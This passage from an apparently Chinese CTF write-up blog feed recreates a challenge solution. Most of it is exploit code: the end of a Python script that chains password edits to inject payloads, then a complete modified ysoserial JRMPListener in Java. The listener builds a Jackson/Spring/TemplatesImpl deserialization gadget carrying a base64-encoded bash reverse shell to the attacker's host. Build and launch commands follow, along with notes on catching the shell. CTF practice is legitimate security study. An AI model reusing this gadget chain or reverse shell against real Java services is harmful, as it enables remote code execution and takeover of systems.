&quot;</span>,<span class="hljs-string">&quot;11111&quot;</span>)<br><br>editpass(<span class="hljs-string">&quot;/void&quot;</span>,<span class="hljs-string">&quot;111&quot;</span>)<br><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> list2:<br>    editpass(s,<span class="hljs-string">&quot;11111&quot;</span>)<br><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> list3:<br>    editpass(s,<span class="hljs-string">&quot;11111&quot;</span>)<br><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> list4:<br>    editpass(s,<span class="hljs-string">&quot;11111&quot;</span>)<br><br>editpass(<span class="hljs-string">&quot;1111111111&quot;</span>,<span class="hljs-string">&quot;11111&quot;</span>)<br>editpass(<span class="hljs-string">&quot;1111111111&quot;</span>,<span class="hljs-string">&quot;11111&quot;</span>)<br><br>editpass(<span class="hljs-string">&quot;haha&quot;</span>,list1[<span class="hljs-number">0</span>])<br><br>editpass(<span class="hljs-string">&quot;11111&quot;</span>,<span class="hljs-string">&quot;111&quot;</span>)<br><br><span class="hljs-comment"># Now it&#x27;s the shortest (237)</span><br><br><span class="hljs-keyword">for</span> payload <span class="hljs-keyword">in</span> list1[<span class="hljs-number">1</span>::]:<br>    editpass(<span class="hljs-string">&quot;_____&quot;</span>,payload)<br><br>editpass(<span class="hljs-string">&quot;____&quot;</span>,<span class="hljs-string">&quot;&lt;!--&quot;</span>)<br><br>requests.post(targeturl+<span class="hljs-string">&quot;/login&quot;</span>,data=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>&#125;)<br></code></pre></td></tr></table></figure><p>将JRMPListener修改一下，我的修改方式如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.exploit;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.net.InetSocketAddress;<br><span class="hljs-keyword">import</span> java.net.ServerSocket;<br><span class="hljs-keyword">import</span> java.net.Socket;<br><span class="hljs-keyword">import</span> java.net.SocketException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.rmi.MarshalException;<br><span class="hljs-keyword">import</span> java.rmi.server.ObjID;<br><span class="hljs-keyword">import</span> java.rmi.server.UID;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.ArrayNode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><span class="hljs-keyword">import</span> sun.rmi.transport.TransportConstants;<br><span class="hljs-keyword">import</span> ysoserial.payloads.ObjectPayload.Utils;<br><span class="hljs-keyword">import</span> ysoserial.payloads.util.Reflections;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Generic JRMP listener</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Opens up an JRMP listener that will deliver the specified payload to any</span><br><span class="hljs-comment"> * client connecting to it and making a call.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> mbechler</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@SuppressWarnings</span> ( &#123;<br>    <span class="hljs-string">&quot;restriction&quot;</span><br>&#125; )<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JRMPListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> port;<br>    <span class="hljs-keyword">private</span> Object payloadObject;<br>    <span class="hljs-keyword">private</span> ServerSocket ss;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">Object</span> <span class="hljs-variable">waitLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> exit;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> hadConnection;<br>    <span class="hljs-keyword">private</span> URL classpathUrl;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JRMPListener</span><span class="hljs-params">(<span class="hljs-type">int</span> port, Object payloadObject )</span> <span class="hljs-keyword">throws</span> NumberFormatException, IOException &#123;<br>        <span class="hljs-built_in">this</span>.port = port;<br>        <span class="hljs-built_in">this</span>.payloadObject = payloadObject;<br>        <span class="hljs-built_in">this</span>.ss = ServerSocketFactory.getDefault().createServerSocket(<span class="hljs-built_in">this</span>.port);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JRMPListener</span><span class="hljs-params">(<span class="hljs-type">int</span> port, String className, URL classpathUrl)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">this</span>.port = port;<br>        <span class="hljs-built_in">this</span>.payloadObject = makeDummyObject(className);<br>        <span class="hljs-built_in">this</span>.classpathUrl = classpathUrl;<br>        <span class="hljs-built_in">this</span>.ss = ServerSocketFactory.getDefault().createServerSocket(<span class="hljs-built_in">this</span>.port);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">waitFor</span> <span class="hljs-params">( <span class="hljs-type">int</span> i )</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">this</span>.hadConnection ) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            System.err.println(<span class="hljs-string">&quot;Waiting for connection&quot;</span>);<br>            <span class="hljs-keyword">synchronized</span> ( <span class="hljs-built_in">this</span>.waitLock ) &#123;<br>                <span class="hljs-built_in">this</span>.waitLock.wait(i);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.hadConnection;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( InterruptedException e ) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span> <span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.exit = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.ss.close();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( IOException e ) &#123;&#125;<br>        <span class="hljs-keyword">synchronized</span> ( <span class="hljs-built_in">this</span>.waitLock ) &#123;<br>            <span class="hljs-built_in">this</span>.waitLock.notify();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//exp部分</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.txt&quot;</span>));<br>        objo.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">obji</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;ser.txt&quot;</span>));<br>        obji.readObject();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[][] generateEvilBytes() <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(AbstractTranslet.class));<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> cp.makeClass(<span class="hljs-string">&quot;evil&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwL2lwLzg4ODggMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>;<br>        <span class="hljs-comment">// 修改为自己的ip port</span><br>        cc.makeClassInitializer().insertBefore(cmd);<br>        cc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-type">byte</span>[][] evilbyte = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;cc.toBytecode()&#125;;<br><br>        <span class="hljs-keyword">return</span> evilbyte;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj,String fname,T f)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">filed</span> <span class="hljs-operator">=</span> TemplatesImpl.class.getDeclaredField(fname);<br>        filed.setAccessible(<span class="hljs-literal">true</span>);<br>        filed.set(obj,f);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String[] args )</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br><span class="hljs-comment">//        if ( args.length &lt; 3 ) &#123;</span><br><span class="hljs-comment">//            System.err.println(JRMPListener.class.getName() + &quot; &lt;port&gt; &lt;payload_type&gt; &lt;payload_arg&gt;&quot;);</span><br><span class="hljs-comment">//            System.exit(-1);</span><br><span class="hljs-comment">//            return;</span><br><span class="hljs-comment">//        &#125;</span><br><br><span class="hljs-comment">//        final Object payloadObject = Utils.makePayloadObject(args[ 1 ], args[ 2 ]);</span><br>        <span class="hljs-comment">// 删除writeReplace</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass0</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">wt</span> <span class="hljs-operator">=</span> ctClass0.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass0.removeMethod(wt);<br>        ctClass0.toClass();<br><br>        <span class="hljs-comment">//构造恶意TemplatesImpl</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setValue(tmp,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        setValue(tmp,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;123&quot;</span>);<br>        setValue(tmp,<span class="hljs-string">&quot;_bytecodes&quot;</span>,generateEvilBytes());<br><br>        <span class="hljs-comment">//稳定触发</span><br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">support</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        support.setTarget(tmp);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(support);<br>        <span class="hljs-type">Templates</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Templates) Proxy.newProxyInstance(Templates.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,handler);<br><br>        <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">objmapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br>        <span class="hljs-type">ArrayNode</span> <span class="hljs-variable">arrayNode</span> <span class="hljs-operator">=</span>objmapper.createArrayNode();<br>        arrayNode.addPOJO(proxy);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">ex</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-string">&quot;1&quot;</span>); <span class="hljs-comment">//反射绕过构造方法限制</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(ex,arrayNode);<br><br>        Object payloadObject=ex;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> Integer.parseInt(args[ <span class="hljs-number">0</span> ]);<br>            System.err.println(<span class="hljs-string">&quot;* Opening JRMP listener on &quot;</span> + port);<br>            <span class="hljs-type">JRMPListener</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRMPListener</span>(port, payloadObject);<br>            c.run();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            System.err.println(<span class="hljs-string">&quot;Listener error&quot;</span>);<br>            e.printStackTrace(System.err);<br>        &#125;<br><span class="hljs-comment">//        Utils.releasePayload(args[1], payloadObject);</span><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span> <span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Socket</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">while</span> ( !<span class="hljs-built_in">this</span>.exit &amp;&amp; ( s = <span class="hljs-built_in">this</span>.ss.accept() ) != <span class="hljs-literal">null</span> ) &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        s.setSoTimeout(<span class="hljs-number">5000</span>);<br>                        <span class="hljs-type">InetSocketAddress</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> (InetSocketAddress) s.getRemoteSocketAddress();<br>                        System.err.println(<span class="hljs-string">&quot;Have connection from &quot;</span> + remote);<br><br>                        <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> s.getInputStream();<br>                        <span class="hljs-type">InputStream</span> <span class="hljs-variable">bufIn</span> <span class="hljs-operator">=</span> is.markSupported() ? is : <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(is);<br><br>                        <span class="hljs-comment">// Read magic (or HTTP wrapper)</span><br>                        bufIn.mark(<span class="hljs-number">4</span>);<br>                        <span class="hljs-type">DataInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataInputStream</span>(bufIn);<br>                        <span class="hljs-type">int</span> <span class="hljs-variable">magic</span> <span class="hljs-operator">=</span> in.readInt();<br><br>                        <span class="hljs-type">short</span> <span class="hljs-variable">version</span> <span class="hljs-operator">=</span> in.readShort();<br>                        <span class="hljs-keyword">if</span> ( magic != TransportConstants.Magic || version != TransportConstants.Version ) &#123;<br>                            s.close();<br>                            <span class="hljs-keyword">continue</span>;<br>                        &#125;<br><br>                        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">sockOut</span> <span class="hljs-operator">=</span> s.getOutputStream();<br>                        <span class="hljs-type">BufferedOutputStream</span> <span class="hljs-variable">bufOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(sockOut);<br>                        <span class="hljs-type">DataOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataOutputStream</span>(bufOut);<br><br>                        <span class="hljs-type">byte</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> in.readByte();<br>                        <span class="hljs-keyword">switch</span> ( protocol ) &#123;<br>                            <span class="hljs-keyword">case</span> TransportConstants.StreamProtocol:<br>                                out.writeByte(TransportConstants.ProtocolAck);<br>                                <span class="hljs-keyword">if</span> ( remote.getHostName() != <span class="hljs-literal">null</span> ) &#123;<br>                                    out.writeUTF(remote.getHostName());<br>                                &#125; <span class="hljs-keyword">else</span> &#123;<br>                                    out.writeUTF(remote.getAddress().toString());<br>                                &#125;<br>                                out.writeInt(remote.getPort());<br>                                out.flush();<br>                                in.readUTF();<br>                                in.readInt();<br>                            <span class="hljs-keyword">case</span> TransportConstants.SingleOpProtocol:<br>                                doMessage(s, in, out, <span class="hljs-built_in">this</span>.payloadObject);<br>                                <span class="hljs-keyword">break</span>;<br>                            <span class="hljs-keyword">default</span>:<br>                            <span class="hljs-keyword">case</span> TransportConstants.MultiplexProtocol:<br>                                System.err.println(<span class="hljs-string">&quot;Unsupported protocol&quot;</span>);<br>                                s.close();<br>                                <span class="hljs-keyword">continue</span>;<br>                        &#125;<br><br>                        bufOut.flush();<br>                        out.flush();<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span> ( InterruptedException e ) &#123;<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>                        e.printStackTrace(System.err);<br>                    &#125;<br>                    <span class="hljs-keyword">finally</span> &#123;<br>                        System.err.println(<span class="hljs-string">&quot;Closing connection&quot;</span>);<br>                        s.close();<br>                    &#125;<br><br>                &#125;<br><br>            &#125;<br>            <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">if</span> ( s != <span class="hljs-literal">null</span> ) &#123;<br>                    s.close();<br>                &#125;<br>                <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">this</span>.ss != <span class="hljs-literal">null</span> ) &#123;<br>                    <span class="hljs-built_in">this</span>.ss.close();<br>                &#125;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( SocketException e ) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace(System.err);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doMessage</span> <span class="hljs-params">( Socket s, DataInputStream in, DataOutputStream out, Object payload )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.err.println(<span class="hljs-string">&quot;Reading message...&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">op</span> <span class="hljs-operator">=</span> in.read();<br><br>        <span class="hljs-keyword">switch</span> ( op ) &#123;<br>            <span class="hljs-keyword">case</span> TransportConstants.Call:<br>                <span class="hljs-comment">// service incoming RMI call</span><br>                doCall(in, out, payload);<br>                <span class="hljs-keyword">break</span>;<br><br>            <span class="hljs-keyword">case</span> TransportConstants.Ping:<br>                <span class="hljs-comment">// send ack for ping</span><br>                out.writeByte(TransportConstants.PingAck);<br>                <span class="hljs-keyword">break</span>;<br><br>            <span class="hljs-keyword">case</span> TransportConstants.DGCAck:<br>                <span class="hljs-type">UID</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> UID.read(in);<br>                <span class="hljs-keyword">break</span>;<br><br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;unknown transport op &quot;</span> + op);<br>        &#125;<br><br>        s.close();<br>    &#125;<br><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doCall</span> <span class="hljs-params">( DataInputStream in, DataOutputStream out, Object payload )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(in) &#123;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass ( ObjectStreamClass desc ) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>                <span class="hljs-keyword">if</span> ( <span class="hljs-string">&quot;[Ljava.rmi.server.ObjID;&quot;</span>.equals(desc.getName())) &#123;<br>                    <span class="hljs-keyword">return</span> ObjID[].class;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;java.rmi.server.ObjID&quot;</span>.equals(desc.getName())) &#123;<br>                    <span class="hljs-keyword">return</span> ObjID.class;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( <span class="hljs-string">&quot;java.rmi.server.UID&quot;</span>.equals(desc.getName())) &#123;<br>                    <span class="hljs-keyword">return</span> UID.class;<br>                &#125;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;Not allowed to read object&quot;</span>);<br>            &#125;<br>        &#125;;<br><br>        ObjID read;<br>        <span class="hljs-keyword">try</span> &#123;<br>            read = ObjID.read(ois);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( java.io.IOException e ) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;unable to read objID&quot;</span>, e);<br>        &#125;<br><br><br>        <span class="hljs-keyword">if</span> ( read.hashCode() == <span class="hljs-number">2</span> ) &#123;<br>            ois.readInt(); <span class="hljs-comment">// method</span><br>            ois.readLong(); <span class="hljs-comment">// hash</span><br>            System.err.println(<span class="hljs-string">&quot;Is DGC call for &quot;</span> + Arrays.toString((ObjID[])ois.readObject()));<br>        &#125;<br><br>        System.err.println(<span class="hljs-string">&quot;Sending return with payload for obj &quot;</span> + read);<br><br>        out.writeByte(TransportConstants.Return);<span class="hljs-comment">// transport op</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRMPClient</span>.MarshalOutputStream(out, <span class="hljs-built_in">this</span>.classpathUrl);<br><br>        oos.writeByte(TransportConstants.ExceptionalReturn);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">UID</span>().write(oos);<br><br><span class="hljs-comment">//        BadAttributeValueExpException ex = new BadAttributeValueExpException(null);</span><br><span class="hljs-comment">//        Reflections.setFieldValue(ex, &quot;val&quot;, payload);</span><br>        oos.writeObject(payload);<span class="hljs-comment">//直接写成型的payload过去即可</span><br><br>        oos.flush();<br>        out.flush();<br><br>        <span class="hljs-built_in">this</span>.hadConnection = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">synchronized</span> ( <span class="hljs-built_in">this</span>.waitLock ) &#123;<br>            <span class="hljs-built_in">this</span>.waitLock.notifyAll();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@SuppressWarnings(&#123;&quot;deprecation&quot;&#125;)</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">makeDummyObject</span> <span class="hljs-params">(String className)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">isolation</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>() &#123;&#125;;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPool</span>();<br>            cp.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(Dummy.class));<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> cp.get(Dummy.class.getName());<br>            clazz.setName(className);<br>            <span class="hljs-keyword">return</span> clazz.toClass(isolation).newInstance();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dummy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后使用该命令重新打包一下</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">mvn clean package -DskipTests  <span class="hljs-comment"># 这里不跳过测试会报错，因为不知道版本原因还是怎么的很多依赖和插件爆红</span><br></code></pre></td></tr></table></figure><p>然后用下面的命令开启JRMP服务器</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">java -<span class="hljs-built_in">cp</span> ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 80<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241026144410160.png" alt="image-20241026144410160"></p><p>然后此时打exp反弹shell</p><p>exp执行命令如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">python .\exp.py <span class="hljs-string">&quot;http://7ae47afd-3eda-472c-9c1b-7ce01d6a534f.node5.buuoj.cn&quot;</span> <span class="hljs-string">&quot;&lt;vps地址&gt;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241026153215483.png" alt="image-20241026153215483"></p><p><img src="https://cdn.clown2024.cn/image-20241026153245566.png" alt="image-20241026153245566"></p><p><img src="https://cdn.clown2024.cn/image-20241026153257626.png" alt="image-20241026153257626"></p><p>弹shell过来拿到flag</p><blockquote><p>艹了打exp的时候一直写错服务器地址蠢了，多加了一个http:&#x2F;&#x2F;，直接写ip就行了</p><p>还有一点是rmi:&#x2F;&#x2F;&lt;服务器地址&gt;&#x2F;a 这里要加一个访问路径，不然也会收不到payload，这我在本地测试过，我也不清楚为啥，可以跟JRMP的模块实现有关，这部分后面学习JRMP模块的时候再探究一下</p></blockquote><p>这题复现真的曲折，wp写的过于简略让我这个菜鸡看不太懂😭</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;官方wp链接：&lt;a href=&quot;https://www.yuque.com/chuangfeimeiyigeren/eeii37/xn0zhgp85tgoafrz?singleDoc#FAsbS&quot;&gt;https://www.yuque.com/chuangfeimeiyige</summary>
      
    
    
    
    <category term="题目复现" scheme="https://clowsman.github.io/categories/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="ctf" scheme="https://clowsman.github.io/tags/ctf/"/>
    
